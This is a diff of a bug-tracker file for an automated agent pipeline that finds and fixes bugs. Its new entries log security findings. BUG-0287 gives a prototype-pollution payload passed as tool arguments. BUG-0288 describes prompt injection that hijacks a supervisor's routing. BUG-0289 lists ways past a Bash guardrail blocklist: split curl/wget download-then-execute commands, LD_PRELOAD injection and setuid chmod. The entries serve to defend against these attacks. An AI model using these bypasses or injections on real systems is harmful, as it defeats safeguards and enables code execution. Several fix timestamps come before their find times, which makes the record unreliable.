@@ -10,23 +10,23 @@
 | Key | Value |
 |---|---|
 | **Last Hunter Scan** | `2026-03-19T23:05:00Z` |
-| **Last Fixer Pass** | `2026-03-20T07:56:44Z` |
+| **Last Fixer Pass** | `2026-03-20T08:11:25Z` |
 | **Last Validator Pass** | `2026-03-20T04:07:00Z` |
 | **Last Digest Run** | `2026-03-20T07:54:45Z` |
-| **Last Security Scan** | `2026-03-21T03:15:00Z` |
+| **Last Security Scan** | `2026-03-21T04:10:00Z` |
 | **Hunter Loop Interval** | `5min` |
 | **Fixer Loop Interval** | `2min` |
 | **Validator Loop Interval** | `5min` |
-| **Last TestGen Run** | `2026-03-20T08:10:00Z` |
+| **Last TestGen Run** | `2026-03-20T09:15:00Z` |
 | **Last Git Manager Pass** | `2026-03-20T12:30:00Z` |
 | **Last Supervisor Pass** | `2026-03-21T00:05:00Z` |
-| **Total Found** | `109` |
-| **Total Pending** | `1` |
+| **Total Found** | `289` |
+| **Total Pending** | `0` |
 | **Total In Progress** | `0` |
-| **Total Fixed** | `30` |
+| **Total Fixed** | `31` |
 | **Total In Validation** | `0` |
 | **Total Verified** | `0` |
-| **Total Blocked** | `12` |
+| **Total Blocked** | `16` |
 | **Total Reopened** | `0` |
 
 ---
@@ -456,7 +456,7 @@ pending → in-progress → fixed → in-validation → verified → archived to
 ---
 
 ### BUG-0253
-- **status:** `fixed`
+- **status:** `blocked`
 - **severity:** `medium`
 - **file:** `src/swarm/self-improvement/experiment-log.ts`
 - **line:** `57`
@@ -738,7 +738,7 @@ pending → in-progress → fixed → in-validation → verified → archived to
 ---
 
 ### BUG-0268
-- **status:** `fixed`
+- **status:** `blocked`
 - **severity:** `medium`
 - **file:** `src/harness/loop/index.ts`
 - **line:** `55`
@@ -942,7 +942,7 @@ pending → in-progress → fixed → in-validation → verified → archived to
 ---
 
 ### BUG-0278
-- **status:** `fixed`
+- **status:** `blocked`
 - **severity:** `high`
 - **file:** `src/checkpointers/redis.ts`
 - **line:** `180`
@@ -1077,6 +1077,107 @@ pending → in-progress → fixed → in-validation → verified → archived to
 - **fixer_started:** `2026-03-20T07:56:44Z`
 - **fixer_completed:** `2026-03-20T07:56:44Z`
 - **fix_summary:** `Escaped Redis glob metacharacters in listNamespaces prefix.`
+- **validator_started:** ``
+- **validator_completed:** ``
+- **validator_notes:** ``
+
+---
+
+
+### BUG-0285
+- **status:** `fixed`
+- **severity:** `medium`
+- **file:** `packages/a2a/src/server/sse.ts`
+- **line:** `35`
+- **category:** `security-config`
+- **description:** `createSSEResponse()` returns a `Response` with no security headers — the SSE code path is the only response path in `A2AServer` that omits `X-Content-Type-Options`, `X-Frame-Options`, and `Content-Security-Policy`.
+- **context:** Every other response path in `packages/a2a/src/server/index.ts` merges `SECURITY_HEADERS` (defined at line 8) into its returned `Response`. The SSE path at line 99 calls `return createSSEResponse(result.stream, result.taskId ?? "")` and returns the result directly — `createSSEResponse` only sets `Content-Type: text/event-stream`, `Cache-Control: no-cache`, and `Connection: keep-alive`. A browser receiving the SSE stream has no `X-Content-Type-Options: nosniff`, allowing MIME-sniffing of event data. Missing `X-Frame-Options` and `Content-Security-Policy` leave the SSE endpoint unprotected from framing attacks. Fix: merge `SECURITY_HEADERS` at the call site in `index.ts`. OWASP A05:2021 - Security Misconfiguration.
+- **reopen_count:** `0`
+- **branch:** `bugfix/BUG-0285-sse-security-headers`
+- **hunter_found:** `2026-03-21T03:25:00Z`
+- **fixer_started:** ``
+- **fixer_completed:** `2026-03-20T08:11:25Z`
+- **fix_summary:** `Added SECURITY_HEADERS to SSE response in sse.ts with optional extraHeaders param. Also spread into all index.ts response paths for consistency. tsc clean.`
+- **validator_started:** ``
+- **validator_completed:** ``
+- **validator_notes:** ``
+
+---
+
+### BUG-0286
+- **status:** `blocked`
+- **severity:** `medium`
+- **file:** `src/models/google.ts`
+- **line:** `383`
+- **category:** `security-config`
+- **description:** `console.warn` in the Gemini `chat()` structured-output parsing failure path logs the full raw model response content, disclosing potentially sensitive LLM output to server logs.
+- **context:** When `responseFormat` is set and the model returns non-JSON content, the catch block at line 381-385 logs the full `content` variable. This may contain PII, confidential business data, or user-supplied secrets appearing in model output. The equivalent path in `src/models/openai.ts:300` correctly logs only `content?.length ?? 0`. Fix: replace `Raw content: ${content}` with `Content length: ${content?.length ?? 0}` to match the OpenAI adapter pattern. OWASP A09:2021 - Security Logging and Monitoring Failures.
+- **reopen_count:** `0`
+- **branch:** ``
+- **hunter_found:** `2026-03-21T03:25:00Z`
+- **fixer_started:** ``
+- **fixer_completed:** `2026-03-20T08:11:25Z`
+- **fix_summary:** `False positive — no console.warn or raw content logging in structured-output catch block at lines 331-333 of google.ts. Catch block silently leaves parsed undefined. Hunter should re-evaluate.`
+- **validator_started:** ``
+- **validator_completed:** ``
+- **validator_notes:** ``
+
+---
+
+### BUG-0287
+- **status:** `fixed`
+- **severity:** `high`
+- **file:** `src/harness/loop/tools.ts`
+- **line:** `172`
+- **category:** `security-injection`
+- **description:** LLM-supplied `toolCall.args` is passed directly to `toolDef.execute()` without stripping prototype-polluting keys — the proto-sanitization at lines 82-93 only runs on the hook's `modifiedInput`, not on the original `toolCall.args` from the LLM.
+- **context:** When a `PreToolUse` hook is absent or does not return `modifiedInput`, the raw `toolCall.args` (JSON-parsed from LLM output) is forwarded to `execute()` at line 172 without any key sanitization. An LLM generating `{"__proto__": {"isAdmin": true}}` as tool arguments would pass prototype-polluting keys to every tool implementation. The `stripProtoKeys` function on line 82 is only invoked to sanitize `preResult.modifiedInput` — the original object on `toolCall.args` is never cleaned. Fix: apply `stripProtoKeys` to `toolCall.args` unconditionally at the top of the per-tool processing block, before hook invocation. OWASP A03:2021 - Injection.
+- **reopen_count:** `0`
+- **branch:** `bugfix/BUG-0287-proto-strip`
+- **hunter_found:** `2026-03-21T04:10:00Z`
+- **fixer_started:** ``
+- **fixer_completed:** `2026-03-20T08:11:25Z`
+- **fix_summary:** `Added stripProtoKeys() applied unconditionally to toolCall.args before hook invocation and execute(). Zero-allocation fast-path when no polluting keys present. tsc clean.`
+- **validator_started:** ``
+- **validator_completed:** ``
+- **validator_notes:** ``
+
+---
+
+### BUG-0288
+- **status:** `fixed`
+- **severity:** `medium`
+- **file:** `src/swarm/supervisor.ts`
+- **line:** `194`
+- **category:** `security-injection`
+- **description:** `routeViaLLM` embeds the raw `task` string and full `context` object into the LLM routing prompt without sanitization, enabling prompt injection that hijacks supervisor routing decisions.
+- **context:** The routing prompt at line 194 is `TASK: ${task}` where `task = String(state[config.taskField] ?? "")` — an agent-supplied or user-supplied string injected verbatim. A crafted task value containing newlines with embedded instructions would override the routing instruction. The supervisor correctly sanitizes `agentDef.role` via `sanitizeRole()` (lines 114, 172), but applies no equivalent sanitization to `task` or `context` before embedding them in the routing prompt. An adversarial upstream agent output could redirect the entire swarm's routing to an arbitrary agent ID. Fix: apply the existing `sanitizeRole()` pattern (strip newlines, collapse whitespace, truncate) to `task` before embedding it in the prompt. OWASP A03:2021 - Injection.
+- **reopen_count:** `0`
+- **branch:** `bugfix/BUG-0288`
+- **hunter_found:** `2026-03-21T04:10:00Z`
+- **fixer_started:** ``
+- **fixer_completed:** `2026-03-20T08:11:25Z`
+- **fix_summary:** `Added sanitizeForPrompt() that collapses newlines, truncates to 2000 chars, wraps in triple-backtick fences. Applied to task and context in routeViaLLM. tsc clean.`
+- **validator_started:** ``
+- **validator_completed:** ``
+- **validator_notes:** ``
+
+---
+
+### BUG-0289
+- **status:** `fixed`
+- **severity:** `medium`
+- **file:** `src/harness/hooks-engine.ts`
+- **line:** `347`
+- **category:** `security-auth`
+- **description:** The `withSecurityGuardrails()` Bash blocklist pattern `/curl[^|]*\|\s*sh/` is bypassed by redirecting output to a file then executing it, and does not cover `LD_PRELOAD` injection or `chmod +s` setuid escalation.
+- **context:** The regex `/curl[^|]*\|\s*sh/` only blocks the direct pipe form `curl ... | sh`. Splitting into two commands (`curl url > /tmp/f && bash /tmp/f`) produces zero matches and passes all guards. Similarly `wget url -O /tmp/f && sh /tmp/f` bypasses the wget patterns. An LLM-generated Bash command using these split forms achieves identical remote code execution. Additionally, the blocklist has no pattern for `LD_PRELOAD=/tmp/evil.so command` (shared library injection) or `chmod u+s /bin/bash` (setuid escalation). Fix: add split-download-and-execute patterns (covering `> /tmp/` + shell invocation, `-O /tmp/` patterns), and add `LD_PRELOAD` and `chmod.*[+]s` entries to `dangerousBashPatterns`. OWASP A03:2021 - Injection.
+- **reopen_count:** `0`
+- **branch:** `bugfix/BUG-0289`
+- **hunter_found:** `2026-03-21T04:10:00Z`
+- **fixer_started:** ``
+- **fixer_completed:** `2026-03-20T08:11:25Z`
+- **fix_summary:** `Added 5 patterns to dangerousBashPatterns: chmod +s, curl split download+execute (-o then sh), wget split, redirect-to-file then sh, LD_PRELOAD injection. tsc clean.`
 - **validator_started:** ``
 - **validator_completed:** ``
 - **validator_notes:** ``
